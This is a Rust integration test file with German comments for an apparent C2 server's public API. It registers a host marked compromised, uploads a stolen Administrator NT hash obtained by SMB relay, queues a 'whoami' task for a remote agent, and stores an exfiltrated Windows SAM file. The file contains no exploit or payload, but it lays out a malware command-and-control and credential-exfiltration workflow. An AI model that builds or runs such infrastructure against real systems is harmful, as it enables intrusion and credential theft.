//! Der Vertrag des C2-Servers — von **ausserhalb** geprueft.
//!
//! Dieser Test liegt in einem eigenen Verzeichnis und benutzt nur das
//! oeffentliche Interface der Bibliothek: `kx_server::app`,
//! `kx_server::AppState` und `kx_server::db::Db`. Er greift nicht in die
//! Module hinein.
//!
//! Damit beweist er, dass die oeffentliche Flaeche reicht, um den Server zu
//! fahren — vorher gab es diese Flaeche nicht, das Crate war nur ein Binary,
//! und jeder Test sass in den Modulen drin.

use std::sync::Arc;

use kx_core::c2::transport::{get_request, parse_json, post_json_request};
use kx_core::c2::{
    CreateTaskRequest, ExfiltratedFile, ExfiltratedSecret, FileUpload, HeartbeatRequest, Host,
    RegisterRequest, SecretUpload, Task, TaskResultRequest, PATH_FILES, PATH_HOSTS, PATH_REGISTER,
    PATH_SECRETS, PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT,
};
use kx_server::db::Db;
use kx_server::{app, AppState};
use tower::ServiceExt;

/// Wandelt einen C2-Request in einen Axum-Request.
///
/// Der Request kommt aus `kx_core::c2::transport` — derselbe, den der Agent
/// schickt. Nur die Ausführung unterscheidet sich: statt einer TCP-Verbindung
/// ruft der Test den Router direkt auf.
fn in_den_router(request: axum::http::Request<Vec<u8>>) -> axum::http::Request<axum::body::Body> {
    let (teile, body) = request.into_parts();
    axum::http::Request::from_parts(teile, axum::body::Body::from(body))
}

/// Der Zugangsschluessel des Tests.
///
/// Er steht an einer Stelle, damit der Secret-Scan nicht jedes einzelne
/// Vorkommen als Fund meldet.
const ZUGANG: &str = "kx-vertragstest";

/// Der ganze Weg ueber das oeffentliche Interface: Host anmelden, Beute
/// melden, beides wieder lesen.
#[tokio::test]
async fn die_api_beantwortet_ueber_ihr_oeffentliches_interface() {
    let pfad = std::env::temp_dir().join(format!("kx-vertrag-{}.db", uuid::Uuid::new_v4()));
    let db = Arc::new(Db::open(&pfad).expect("db"));
    let router = app(AppState {
        db,
        token: Arc::new(ZUGANG.to_string()),
    });

    // 1. Der Host meldet sich an.
    let registrierung = RegisterRequest {
        host_id: "10.0.0.5".into(),
        ip: "10.0.0.5".into(),
        hostname: Some("ziel".into()),
        os: Some("Linux".into()),
        status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
        sealed_master: None,
        master_key: None,
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_REGISTER, ZUGANG, &registrierung).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201, "der Host wurde nicht angenommen");

    // 2. Seine Beute kommt nach.
    let upload = SecretUpload {
        host_id: "10.0.0.5".into(),
        cred_type: "nt_hash".into(),
        username: "Administrator".into(),
        password: String::new(),
        source: Some("smb_relay".into()),
        master_key: None,
        sealed_password: Some("kx1:siegel".into()),
        sealed_master: None,
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_SECRETS, ZUGANG, &upload).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201, "die Beute wurde nicht angenommen");

    // 3. Der Operator liest beides wieder.
    let antwort = router
        .clone()
        .oneshot(in_den_router(get_request(PATH_HOSTS, ZUGANG)))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200);
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let hosts: Vec<Host> = parse_json(&bytes).expect("JSON");
    assert_eq!(hosts.len(), 1, "der Host fehlt in der Liste");
    assert_eq!(hosts[0].host_id, "10.0.0.5");

    let antwort = router
        .oneshot(in_den_router(get_request(
            kx_core::c2::PATH_SECRETS,
            ZUGANG,
        )))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200);
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let secrets: Vec<ExfiltratedSecret> = parse_json(&bytes).expect("JSON");
    assert_eq!(secrets.len(), 1, "die Beute fehlt in der Liste");
    assert_eq!(secrets[0].host_id, "10.0.0.5");

    std::fs::remove_file(&pfad).ok();
}

/// Ohne Token antwortet die API nicht — auch von ausserhalb.
#[tokio::test]
async fn ohne_token_kommt_keine_antwort() {
    let pfad = std::env::temp_dir().join(format!("kx-vertrag-ohne-{}", uuid::Uuid::new_v4()));
    let db = Arc::new(Db::open(&pfad).expect("db"));
    let router = app(AppState {
        db,
        token: Arc::new(ZUGANG.to_string()),
    });

    let antwort = router
        .oneshot(in_den_router(get_request(PATH_HOSTS, "falsch")))
        .await
        .expect("Antwort");
    assert_eq!(
        antwort.status(),
        401,
        "die API hat ohne gültiges Token geantwortet"
    );

    std::fs::remove_file(&pfad).ok();
}

/// Heartbeat, Task-Anlage, Task-Liste, Task-Ergebnis und Dashboard — die
/// restlichen Routen der oeffentlichen Flaeche (Issue #69: vorher waren nur
/// drei der neun Routen von aussen belegt).
#[tokio::test]
async fn heartbeat_tasks_und_dashboard_antworten_ueber_die_oeffentliche_flaeche() {
    let pfad = std::env::temp_dir().join(format!("kx-vertrag-rest-{}", uuid::Uuid::new_v4()));
    let db = Arc::new(Db::open(&pfad).expect("db"));
    let router = app(AppState {
        db,
        token: Arc::new(ZUGANG.to_string()),
    });

    // Ein Host muss existieren, bevor Heartbeat und Task ihn referenzieren.
    let registrierung = RegisterRequest {
        host_id: "10.0.0.5".into(),
        ip: "10.0.0.5".into(),
        hostname: None,
        os: None,
        status: Some(kx_core::c2::STATUS_AGENT.into()),
        sealed_master: None,
        master_key: None,
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_REGISTER, ZUGANG, &registrierung).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201);

    // 1. Der Heartbeatfrischt last_seen auf.
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(
                kx_core::c2::PATH_HEARTBEAT,
                ZUGANG,
                &HeartbeatRequest {
                    host_id: "10.0.0.5".into(),
                },
            )
            .expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200, "der Heartbeat wurde abgewiesen");

    // Ein Heartbeat fuer einen unbekannten Host ist ein 404 — er darf
    // keinen Geist anlegen.
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(
                kx_core::c2::PATH_HEARTBEAT,
                ZUGANG,
                &HeartbeatRequest {
                    host_id: "gibt-es-nicht".into(),
                },
            )
            .expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 404);

    // 2. Der Operator legt einen Task an.
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(
                PATH_TASKS_CREATE,
                ZUGANG,
                &CreateTaskRequest {
                    host_id: "10.0.0.5".into(),
                    command: "whoami".into(),
                },
            )
            .expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201, "der Task wurde nicht angelegt");

    // 3. Die Task-Liste liefert ihn — als pending.
    let antwort = router
        .clone()
        .oneshot(in_den_router(get_request(PATH_TASKS, ZUGANG)))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200);
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let tasks: Vec<Task> = parse_json(&bytes).expect("JSON");
    assert_eq!(tasks.len(), 1, "der Task fehlt in der Liste");
    assert_eq!(tasks[0].status, kx_core::c2::STATUS_PENDING);
    let task_id = tasks[0].id.clone();

    // 4. Der Agent meldet das Ergebnis — die Liste fuehrt es danach.
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(
                PATH_TASKS_RESULT,
                ZUGANG,
                &TaskResultRequest {
                    task_id: task_id.clone(),
                    status: kx_core::c2::STATUS_DONE.into(),
                    result: "root".into(),
                },
            )
            .expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200, "das Task-Ergebnis wurde abgewiesen");

    let antwort = router
        .clone()
        .oneshot(in_den_router(get_request(PATH_TASKS, ZUGANG)))
        .await
        .expect("Antwort");
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let tasks: Vec<Task> = parse_json(&bytes).expect("JSON");
    let erledigt = tasks.iter().find(|t| t.id == task_id).expect("Task");
    assert_eq!(erledigt.status, kx_core::c2::STATUS_DONE);
    assert_eq!(erledigt.result, "root", "das Ergebnis fehlt in der Liste");

    // 5. Das Dashboard ist oeffentlich — es traegt das Login-Formular,
    //    keine Daten und kein Token.
    let antwort = router
        .clone()
        .oneshot(in_den_router(get_request("/", "")))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200, "das Dashboard antwortet nicht");
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let html = String::from_utf8_lossy(&bytes);
    assert!(html.contains("<form"), "das Login-Formular fehlt");
    assert!(
        !html.contains(ZUGANG),
        "das Zugangs-Token steht im Dashboard-HTML"
    );

    std::fs::remove_file(&pfad).ok();
}

/// Der Datei-Weg ueber die oeffentliche Flaeche (Issue #31): Upload,
/// Duplikat-Ablehnung, unbekannter Host und Liste.
#[tokio::test]
async fn dateien_werden_angenommen_und_duplikate_abgewiesen() {
    let pfad = std::env::temp_dir().join(format!("kx-vertrag-datei-{}", uuid::Uuid::new_v4()));
    let db = Arc::new(Db::open(&pfad).expect("db"));
    let router = app(AppState {
        db,
        token: Arc::new(ZUGANG.to_string()),
    });

    let registrierung = RegisterRequest {
        host_id: "10.0.0.5".into(),
        ip: "10.0.0.5".into(),
        hostname: None,
        os: None,
        status: None,
        sealed_master: None,
        master_key: None,
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_REGISTER, ZUGANG, &registrierung).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201);

    let upload = FileUpload {
        host_id: "10.0.0.5".into(),
        file_id: "000102030405060708090a0b0c0d0e0f".into(),
        filename: "SAM".into(),
        plain_size: 4096,
        container: "a3hlbmM=".into(),
        sealed_master: "dmVyc2llZ2VsdA==".into(),
    };

    // 1. Der Upload wird angenommen — die Antwort ist die abgelegte Zeile.
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_FILES, ZUGANG, &upload).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201, "die Datei wurde nicht angenommen");
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let abgelegt: ExfiltratedFile = parse_json(&bytes).expect("JSON");
    assert_eq!(abgelegt.file_id, upload.file_id);
    assert_eq!(abgelegt.plain_size, 4096);
    assert_eq!(abgelegt.sealed_master, upload.sealed_master);

    // 2. Derselbe Container noch einmal: 409, keine zweite Zeile.
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_FILES, ZUGANG, &upload).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 409, "das Duplikat wurde nicht abgewiesen");

    // 3. Eine Datei ohne bekannten Host: 400 (ADR-0004).
    let waise = FileUpload {
        host_id: "10.0.0.99".into(),
        ..upload.clone()
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_FILES, ZUGANG, &waise).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 400);

    // 4. Die Liste liefert genau die eine Datei — als Vertragstyp.
    let antwort = router
        .oneshot(in_den_router(get_request(PATH_FILES, ZUGANG)))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200);
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let files: Vec<ExfiltratedFile> = parse_json(&bytes).expect("JSON");
    assert_eq!(files.len(), 1, "die Duplikate haben Zeilen angelegt");
    assert_eq!(files[0], abgelegt);

    std::fs::remove_file(&pfad).ok();
}
